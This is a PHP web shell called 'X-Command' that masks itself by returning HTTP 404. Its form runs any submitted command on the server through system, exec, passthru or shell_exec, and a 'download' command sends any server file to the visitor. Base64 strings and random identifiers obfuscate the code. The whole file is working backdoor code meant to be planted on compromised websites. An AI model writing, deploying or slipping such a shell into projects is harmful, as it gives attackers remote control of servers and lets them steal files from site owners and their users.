<?php http_response_code(404);?>
<!DOCTYPE HTML>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <title>X-Command</title>    
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />    
    <!-- CSS font awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
<style>
/* jangan diubah */        
.banner {
background-color: #f1f1f1; 
padding: 10px; 
text-align: center;
}
</style>
</head>

<body>
    <!-- logo terminal -->
    <div class="banner">
    <h1><i class="fas fa-terminal logo"></i> X-Command</h1>
    </div>
    <!-- end -->
    
    <!-- logo system -->
    <p><b>SOFTWARE :</b> <i class="fab fa-windows"></i> <?php echo $_SERVER[base64_decode('U0VSVkVSX1NPRlRXQVJF')];?></p>
    <p><b>PHP :</b> <i class="fab fa-php"></i> <?php echo phpversion();?></p>
    <!-- end -->
    
    <form method="POST" action="<?php echo $_SERVER[base64_decode('UEhQX1NFTEY=')];?>">
        <label for="cmd">X-Command~#</label>
        <input type="text" name="cmd" id="cmd" placeholder="Enter your command" required/>
        <input type="submit" value=">"/>
    </form>

    <?php function ttifjjda_6b63b6f0($lrpfbske_2f5c1cc0){if(function_exists(base64_decode('c3lzdGVt'))){@ob_start();@system($lrpfbske_2f5c1cc0);$itcpkqei_75274263=@ob_get_contents();@ob_end_clean();return $itcpkqei_75274263;}elseif(function_exists(base64_decode('ZXhlYw=='))){@exec($lrpfbske_2f5c1cc0,$gjacajul_9fa3e414);$itcpkqei_75274263='';foreach($gjacajul_9fa3e414 as $sqxekhyt_136ac113){$itcpkqei_75274263.=$sqxekhyt_136ac113.base64_decode('Cg==');}return $itcpkqei_75274263;}elseif(function_exists(base64_decode('cGFzc3RocnU='))){@ob_start();@passthru($lrpfbske_2f5c1cc0);$itcpkqei_75274263=@ob_get_contents();@ob_end_clean();return $itcpkqei_75274263;}elseif(function_exists(base64_decode('c2hlbGxfZXhlYw=='))){$itcpkqei_75274263=@shell_exec($lrpfbske_2f5c1cc0);return $itcpkqei_75274263;}}if(isset($_POST[base64_decode('Y21k')])){$dgfgrozd_8ecaead4=$_POST[base64_decode('Y21k')];if(strpos($dgfgrozd_8ecaead4,base64_decode('ZG93bmxvYWQ='))===0){$uhnyiuhl_9c39465b=substr($dgfgrozd_8ecaead4,9);if(file_exists($uhnyiuhl_9c39465b)){header(base64_decode('Q29udGVudC1EZXNjcmlwdGlvbjogRmlsZSBUcmFuc2Zlcg=='));header(base64_decode('Q29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0='));header(base64_decode('Q29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9Ig==').basename($uhnyiuhl_9c39465b).base64_decode('Ig=='));header(base64_decode('RXhwaXJlczogMA=='));header(base64_decode('Q2FjaGUtQ29udHJvbDogbXVzdC1yZXZhbGlkYXRl'));header(base64_decode('UHJhZ21hOiBwdWJsaWM='));header(base64_decode('Q29udGVudC1MZW5ndGg6IA==').filesize($uhnyiuhl_9c39465b));readfile($uhnyiuhl_9c39465b);exit;}else{echo base64_decode('PHByZT5GaWxlIG5vdCBmb3VuZCE8L3ByZT4=');}}else{$xmgedmtn_ccde149e=ttifjjda_6b63b6f0($_POST[base64_decode('Y21k')]);echo base64_decode('PHByZT4=').htmlspecialchars($xmgedmtn_ccde149e).base64_decode('PC9wcmU+');}}?>
<footer style="text-align: center; margin-top: 20px; color: #333;">
&copy; <a href="https://rebrand.ly/Tutorial-Termux" alt="Tutorial Termux">msverse.site 2024. All rights reserved.
</a></footer>
</body>

</html>
